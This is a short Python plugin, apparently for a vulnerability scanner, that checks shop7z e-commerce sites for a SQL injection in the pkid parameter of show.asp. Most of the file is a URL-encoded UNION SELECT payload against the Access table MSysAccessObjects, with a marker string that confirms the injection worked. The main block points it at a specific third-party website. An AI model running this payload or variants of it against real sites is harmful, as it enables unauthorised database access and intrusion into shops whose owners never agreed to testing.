#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = shop7z show.asp pkid参数SQL注入漏洞
import re

def assign(service, arg):
    if service == "shop7z":
        return True, arg

def audit(arg):
    payload = 'show.asp?pkid=1%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2CCHR%2832%29%2bCHR%2835%29%2bCHR%28116%29%2bCHR%28121%29%2bCHR%28113%29%2bCHR%2835%29%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%2C33%2C34%2C35%2C36%2C37%2C38%20from%20%20MSysAccessObjects'
    target = arg + payload
    code, head,res, errcode, _   = curl.curl2(target) 
    if  code == 500 and '#tyq#' in res:
        security_hole(target)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('shop7z', 'http://www.99ysbjw.com/')[1])